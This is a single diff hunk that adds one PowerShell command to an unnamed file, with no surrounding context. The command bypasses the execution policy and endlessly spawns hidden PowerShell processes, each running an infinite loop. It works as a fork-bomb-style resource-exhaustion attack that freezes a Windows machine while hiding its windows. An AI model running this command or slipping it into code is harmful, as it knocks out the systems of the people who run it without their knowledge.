@@ -1,0 +1,1 @@
+powershell.exe -ExecutionPolicy Bypass -NoExit -Command "while(1) { Start-Process -WindowStyle Hidden powershell.exe -ArgumentList '-NoExit', '-Command', 'while(1) {1}' }"
